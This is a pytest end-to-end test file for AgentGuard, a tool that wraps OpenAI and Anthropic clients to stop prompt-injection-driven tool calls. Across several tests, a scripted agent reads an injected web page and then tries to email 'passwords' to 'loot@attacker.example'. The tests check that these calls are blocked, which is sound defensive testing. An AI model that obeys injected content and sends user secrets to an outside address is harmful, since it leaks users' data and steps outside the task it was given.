"""End-to-end: real provider SDK clients wrapped by AgentGuard, against a scripted model."""

from __future__ import annotations

import json

import httpx
import pytest

from agentguard import Guard, ToolCallBlocked
from agentguard.core.detectors.heuristic import HeuristicDetector
from agentguard.core.errors import AgentGuardError
from agentguard.core.events import MemorySink
from agentguard.core.policy.loader import parse_policy
from tests.e2e.scripted import (
    INJECTED_PAGE,
    USER_TASK,
    ScriptedProvider,
    anthropic_stream_tool_use,
    anthropic_tool_use,
    openai_stream_tool_call,
    openai_text,
    openai_tool_call,
)

openai = pytest.importorskip("openai")
anthropic = pytest.importorskip("anthropic")
httpx2 = pytest.importorskip("httpx2")

POLICY = parse_policy(
    """
tools:
  read_web: { role: source, risk: low, ref_arg: url }
  send_email: { role: sink, risk: high, destination_args: [to] }
"""
)

TOOLS = [
    {
        "type": "function",
        "function": {
            "name": "read_web",
            "parameters": {"type": "object", "properties": {"url": {"type": "string"}}},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "send_email",
            "parameters": {
                "type": "object",
                "properties": {"to": {"type": "string"}, "body": {"type": "string"}},
            },
        },
    },
]


def make_guard(**kw):  # type: ignore[no-untyped-def]
    sink = MemorySink()
    return Guard(POLICY, detectors=[HeuristicDetector()], sinks=[sink], **kw), sink


def conversation() -> list[dict]:
    return [
        {"role": "system", "content": "You are a helpful assistant."},
        {"role": "user", "content": USER_TASK},
        {
            "role": "assistant",
            "content": None,
            "tool_calls": [
                {
                    "id": "call_1",
                    "type": "function",
                    "function": {
                        "name": "read_web",
                        "arguments": json.dumps({"url": "https://trails.example/rmnp"}),
                    },
                }
            ],
        },
        {"role": "tool", "tool_call_id": "call_1", "content": INJECTED_PAGE},
    ]


def test_openai_agent_loop_blocks_injected_exfil() -> None:
    guard, sink = make_guard()
    provider = ScriptedProvider(
        [
            openai_tool_call("read_web", {"url": "https://trails.example/rmnp"}),
            openai_tool_call("send_email", {"to": "loot@attacker.example", "body": "passwords"}, "call_2"),
        ]
    )
    client = guard.wrap_openai(
        openai.OpenAI(
            api_key="sk-test",
            base_url="http://llm.test/v1",
            http_client=httpx.Client(transport=provider.transport()),
        )
    )
    messages: list[dict] = [
        {"role": "system", "content": "You are a helpful assistant."},
        {"role": "user", "content": USER_TASK},
    ]
    executed = []
    with guard.session():
        for _ in range(2):
            resp = client.chat.completions.create(model="gpt-test", messages=messages, tools=TOOLS)
            msg = resp.choices[0].message
            if not msg.tool_calls:
                break
            messages.append(msg.model_dump(exclude_none=True))
            for tc in msg.tool_calls:
                executed.append(tc.function.name)
                messages.append({"role": "tool", "tool_call_id": tc.id, "content": INJECTED_PAGE})
    assert executed == ["read_web"]
    final = resp.choices[0]
    assert final.message.tool_calls is None
    assert final.finish_reason == "stop"
    assert "AgentGuard blocked the call to 'send_email'" in final.message.content
    blocked = [e for e in sink.events if e["type"] == "tool_call" and e["action"] == "BLOCK"]
    assert blocked
    assert any(
        "send_email.to derived from read_web(url=https://trails.example/rmnp)" in c for c in blocked[0]["taint_chain"]
    )


def test_openai_allows_user_requested_send_and_raise_mode() -> None:
    guard, _ = make_guard()
    provider = ScriptedProvider([openai_tool_call("send_email", {"to": "me@acme.com", "body": "Trails: Bear Lake"})])
    client = guard.wrap_openai(
        openai.OpenAI(
            api_key="k",
            base_url="http://llm.test/v1",
            http_client=httpx.Client(transport=provider.transport()),
        )
    )
    with guard.session():
        msgs = conversation()
        msgs[-1]["content"] = "Trail guide: Bear Lake loop, 3.2 miles."
        resp = client.chat.completions.create(model="m", messages=msgs)
    assert resp.choices[0].message.tool_calls[0].function.name == "send_email"

    guard2, _ = make_guard()
    provider2 = ScriptedProvider([openai_tool_call("send_email", {"to": "loot@attacker.example"})])
    client2 = guard2.wrap_openai(
        openai.OpenAI(
            api_key="k",
            base_url="http://llm.test/v1",
            http_client=httpx.Client(transport=provider2.transport()),
        ),
        mode="raise",
    )
    with guard2.session(), pytest.raises(ToolCallBlocked):
        client2.chat.completions.create(model="m", messages=conversation())


def test_openai_withholds_injected_tool_result_from_model() -> None:
    policy = parse_policy("tools:\n  read_web: { role: source, result: { on_injection: BLOCK } }")
    guard = Guard(policy, detectors=[HeuristicDetector()])
    provider = ScriptedProvider([openai_text("ok")])
    client = guard.wrap_openai(
        openai.OpenAI(
            api_key="k",
            base_url="http://llm.test/v1",
            http_client=httpx.Client(transport=provider.transport()),
        )
    )
    client.chat.completions.create(model="m", messages=conversation())
    sent = provider.requests[0]["messages"][-1]["content"]
    assert "withheld" in sent and "loot@attacker.example" not in sent


def test_openai_streaming_blocks_tool_call() -> None:
    guard, _ = make_guard()
    provider = ScriptedProvider([openai_stream_tool_call("send_email", {"to": "loot@attacker.example", "body": "x"})])
    client = guard.wrap_openai(
        openai.OpenAI(
            api_key="k",
            base_url="http://llm.test/v1",
            http_client=httpx.Client(transport=provider.transport()),
        )
    )
    with guard.session():
        stream = client.chat.completions.create(model="m", messages=conversation(), stream=True)
        chunks = list(stream)
    tool_deltas = [c for c in chunks if c.choices and c.choices[0].delta.tool_calls]
    assert tool_deltas == []
    text = "".join(c.choices[0].delta.content or "" for c in chunks if c.choices)
    assert "AgentGuard blocked" in text
    assert chunks[-1].choices[0].finish_reason == "stop"


def test_openai_streaming_allows_benign_tool_call() -> None:
    guard, _ = make_guard()
    provider = ScriptedProvider([openai_stream_tool_call("read_web", {"url": "https://trails.example/rmnp"})])
    client = guard.wrap_openai(
        openai.OpenAI(
            api_key="k",
            base_url="http://llm.test/v1",
            http_client=httpx.Client(transport=provider.transport()),
        )
    )
    with client.chat.completions.create(
        model="m", messages=[{"role": "user", "content": USER_TASK}], stream=True
    ) as stream:
        chunks = list(stream)
    args = "".join(
        c.choices[0].delta.tool_calls[0].function.arguments or ""
        for c in chunks
        if c.choices and c.choices[0].delta.tool_calls
    )
    assert json.loads(args) == {"url": "https://trails.example/rmnp"}
    assert chunks[-1].choices[0].finish_reason == "tool_calls"


async def test_openai_async_client() -> None:
    guard, _ = make_guard()
    provider = ScriptedProvider(
        [
            openai_tool_call("send_email", {"to": "loot@attacker.example"}),
            openai_stream_tool_call("send_email", {"to": "loot@attacker.example"}),
        ]
    )
    client = guard.wrap_openai(
        openai.AsyncOpenAI(
            api_key="k",
            base_url="http://llm.test/v1",
            http_client=httpx.AsyncClient(transport=provider.async_transport()),
        )
    )
    with guard.session():
        resp = await client.chat.completions.create(model="m", messages=conversation())
        assert resp.choices[0].message.tool_calls is None
        stream = await client.chat.completions.create(model="m", messages=conversation(), stream=True)
        chunks = [c async for c in stream]
    assert not any(c.choices and c.choices[0].delta.tool_calls for c in chunks)


def test_openai_responses_api() -> None:
    guard, _ = make_guard()
    resp_json = {
        "id": "resp_1",
        "object": "response",
        "created_at": 1,
        "model": "m",
        "status": "completed",
        "output": [
            {
                "type": "function_call",
                "id": "fc_1",
                "call_id": "c2",
                "name": "send_email",
                "arguments": json.dumps({"to": "loot@attacker.example"}),
                "status": "completed",
            }
        ],
        "parallel_tool_calls": True,
        "tool_choice": "auto",
        "tools": [],
    }
    provider = ScriptedProvider([resp_json])
    client = guard.wrap_openai(
        openai.OpenAI(
            api_key="k",
            base_url="http://llm.test/v1",
            http_client=httpx.Client(transport=provider.transport()),
        )
    )
    items = [
        {"role": "user", "content": USER_TASK},
        {
            "type": "function_call",
            "call_id": "c1",
            "name": "read_web",
            "arguments": json.dumps({"url": "https://trails.example/rmnp"}),
        },
        {"type": "function_call_output", "call_id": "c1", "output": INJECTED_PAGE},
    ]
    with guard.session():
        out = client.responses.create(model="m", input=items)
    assert [o.type for o in out.output] == ["message"]
    assert "AgentGuard blocked" in out.output[0].content[0].text
    with pytest.raises(AgentGuardError):
        client.responses.create(model="m", input=items, stream=True)
    with pytest.raises(AgentGuardError):
        client.chat.completions.parse(model="m", messages=[])


def anthropic_conversation() -> list[dict]:
    return [
        {"role": "user", "content": USER_TASK},
        {
            "role": "assistant",
            "content": [
                {
                    "type": "tool_use",
                    "id": "toolu_0",
                    "name": "read_web",
                    "input": {"url": "https://trails.example/rmnp"},
                }
            ],
        },
        {
            "role": "user",
            "content": [{"type": "tool_result", "tool_use_id": "toolu_0", "content": INJECTED_PAGE}],
        },
    ]


def test_anthropic_blocks_and_rewrites() -> None:
    guard, sink = make_guard()
    provider = ScriptedProvider([anthropic_tool_use("send_email", {"to": "loot@attacker.example", "body": "pw"})])
    client = guard.wrap_anthropic(
        anthropic.Anthropic(
            api_key="k",
            base_url="http://llm.test",
            http_client=httpx2.Client(transport=provider.transport(httpx2)),
        )
    )
    with guard.session():
        msg = client.messages.create(
            model="claude-test", max_tokens=100, system="Be helpful.", messages=anthropic_conversation()
        )
    assert [b.type for b in msg.content] == ["text", "text"]
    assert msg.stop_reason == "end_turn"
    assert "AgentGuard blocked" in msg.content[1].text
    assert any(e.get("taint_chain") for e in sink.events if e["type"] == "tool_call")


def test_anthropic_stream_replaces_blocked_block() -> None:
    guard, _ = make_guard()
    provider = ScriptedProvider([anthropic_stream_tool_use("send_email", {"to": "loot@attacker.example"})])
    client = guard.wrap_anthropic(
        anthropic.Anthropic(
            api_key="k",
            base_url="http://llm.test",
            http_client=httpx2.Client(transport=provider.transport(httpx2)),
        )
    )
    with guard.session():
        events = list(client.messages.create(model="c", max_tokens=10, messages=anthropic_conversation(), stream=True))
    types = [e.type for e in events]
    assert types.count("content_block_start") == 2
    starts = [e for e in events if e.type == "content_block_start"]
    assert starts[1].content_block.type == "text"
    delta = next(e for e in events if e.type == "message_delta")
    assert delta.delta.stop_reason == "end_turn"
    with pytest.raises(AgentGuardError):
        client.messages.stream(model="c", max_tokens=1, messages=[])


async def test_anthropic_async_and_raise() -> None:
    guard, _ = make_guard()
    provider = ScriptedProvider(
        [
            anthropic_tool_use("send_email", {"to": "loot@attacker.example"}),
            anthropic_stream_tool_use("read_web", {"url": "https://ok.example"}),
        ]
    )
    client = guard.wrap_anthropic(
        anthropic.AsyncAnthropic(
            api_key="k",
            base_url="http://llm.test",
            http_client=httpx2.AsyncClient(transport=provider.async_transport(httpx2)),
        ),
        mode="raise",
    )
    with guard.session():
        with pytest.raises(ToolCallBlocked):
            await client.messages.create(model="c", max_tokens=10, messages=anthropic_conversation())
        stream = await client.messages.create(
            model="c",
            max_tokens=10,
            messages=[{"role": "user", "content": "read https://ok.example"}],
            stream=True,
        )
        events = [e async for e in stream]
    assert any(e.type == "content_block_start" and e.content_block.type == "tool_use" for e in events)
